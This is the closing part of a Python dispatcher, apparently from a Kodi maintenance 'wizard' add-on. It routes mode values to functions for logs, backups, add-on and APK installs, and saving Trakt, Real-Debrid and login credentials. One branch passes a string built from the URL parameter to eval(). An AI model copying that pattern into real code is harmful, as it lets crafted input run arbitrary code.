elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5564
elif mode =='viewerrorlog':errorChecking (all =True )#line:5565
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5566
elif mode =='purgedb':purgeDb ()#line:5567
elif mode =='fixaddonupdate':fixUpdate ()#line:5568
elif mode =='removeaddons':removeAddonMenu ()#line:5569
elif mode =='removeaddon':removeAddon (name )#line:5570
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5571
elif mode =='removedata':removeAddonData (name )#line:5572
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5573
elif mode =='systeminfo':systemInfo ()#line:5574
elif mode =='restorezip':restoreit ('build')#line:5575
elif mode =='restoregui':restoreit ('gui')#line:5576
elif mode =='restoreaddon':restoreit ('addondata')#line:5577
elif mode =='restoreextzip':restoreextit ('build')#line:5578
elif mode =='restoreextgui':restoreextit ('gui')#line:5579
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5580
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5581
elif mode =='traktsync':traktsync ()#line:5582
elif mode =='apk':apkMenu (name )#line:5584
elif mode =='apkscrape':apkScraper (name )#line:5585
elif mode =='apkinstall':apkInstaller (name ,url )#line:5586
elif mode =='speed':speedMenu ()#line:5587
elif mode =='net':net_tools ()#line:5588
elif mode =='GetList':GetList (url )#line:5589
elif mode =='youtube':youtubeMenu (name )#line:5590
elif mode =='viewVideo':playVideo (url )#line:5591
elif mode =='addons':addonMenu (name )#line:5593
elif mode =='addoninstall':addonInstaller (name ,url )#line:5594
elif mode =='savedata':saveMenu ()#line:5596
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5597
elif mode =='managedata':manageSaveData (name )#line:5598
elif mode =='whitelist':wiz .whiteList (name )#line:5599
elif mode =='trakt':traktMenu ()#line:5601
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5602
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5603
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5604
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5605
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5606
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5607
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5608
elif mode =='realdebrid':realMenu ()#line:5610
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5611
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5612
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5613
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5614
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5615
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5616
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5617
elif mode =='login':loginMenu ()#line:5619
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5620
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5621
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5622
elif mode =='clearlogin':loginit .clearSaved (name )#line:5623
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5624
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5625
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5626
elif mode =='contact':notify .contact (CONTACT )#line:5628
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5629
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5630
elif mode =='developer':developer ()#line:5632
elif mode =='converttext':wiz .convertText ()#line:5633
elif mode =='createqr':wiz .createQR ()#line:5634
elif mode =='testnotify':testnotify ()#line:5635
elif mode =='testnotify2':testnotify2 ()#line:5636
elif mode =='servicemanual':servicemanual ()#line:5637
elif mode =='fastinstall':fastinstall ()#line:5638
elif mode =='testupdate':testupdate ()#line:5639
elif mode =='testfirst':testfirst ()#line:5640
elif mode =='testfirstrun':testfirstRun ()#line:5641
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5642
elif mode =='bg':wiz .bg_install (name ,url )#line:5644
elif mode =='bgcustom':wiz .bg_custom ()#line:5645
elif mode =='bgremove':wiz .bg_remove ()#line:5646
elif mode =='bgdefault':wiz .bg_default ()#line:5647
elif mode =='rdset':rdsetup ()#line:5648
elif mode =='mor':morsetup ()#line:5649
elif mode =='mor2':morsetup2 ()#line:5650
elif mode =='resolveurl':resolveurlsetup ()#line:5651
elif mode =='urlresolver':urlresolversetup ()#line:5652
elif mode =='forcefastupdate':forcefastupdate ()#line:5653
elif mode =='traktset':traktsetup ()#line:5654
elif mode =='placentaset':placentasetup ()#line:5655
elif mode =='flixnetset':flixnetsetup ()#line:5656
elif mode =='reptiliaset':reptiliasetup ()#line:5657
elif mode =='yodasset':yodasetup ()#line:5658
elif mode =='numbersset':numberssetup ()#line:5659
elif mode =='uranusset':uranussetup ()#line:5660
elif mode =='genesisset':genesissetup ()#line:5661
elif mode =='fastupdate':fastupdate ()#line:5662
elif mode =='folderback':folderback ()#line:5663
elif mode =='menudata':Menu ()#line:5664
elif mode ==2 :#line:5666
        wiz .torent_menu ()#line:5667
elif mode ==3 :#line:5668
        wiz .popcorn_menu ()#line:5669
elif mode ==8 :#line:5670
        wiz .metaliq_fix ()#line:5671
elif mode ==9 :#line:5672
        wiz .quasar_menu ()#line:5673
elif mode ==5 :#line:5674
        swapSkins ('skin.Premium.mod')#line:5675
elif mode ==13 :#line:5676
        wiz .elementum_menu ()#line:5677
elif mode ==16 :#line:5678
        wiz .fix_wizard ()#line:5679
elif mode ==17 :#line:5680
        wiz .last_play ()#line:5681
elif mode ==18 :#line:5682
        wiz .normal_metalliq ()#line:5683
elif mode ==19 :#line:5684
        wiz .fast_metalliq ()#line:5685
elif mode ==20 :#line:5686
        wiz .fix_buffer2 ()#line:5687
elif mode ==21 :#line:5688
        wiz .fix_buffer3 ()#line:5689
elif mode ==11 :#line:5690
        wiz .fix_buffer ()#line:5691
elif mode ==15 :#line:5692
        wiz .fix_font ()#line:5693
elif mode ==14 :#line:5694
        wiz .clean_pass ()#line:5695
elif mode ==22 :#line:5696
        wiz .movie_update ()#line:5697
elif mode =='adv_settings':buffer1 ()#line:5698
elif mode =='getpass':getpass ()#line:5699
elif mode =='setpass':setpass ()#line:5700
elif mode =='setuname':setuname ()#line:5701
elif mode =='passandUsername':passandUsername ()#line:5702
elif mode =='9':disply_hwr ()#line:5703
elif mode =='99':disply_hwr2 ()#line:5704
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))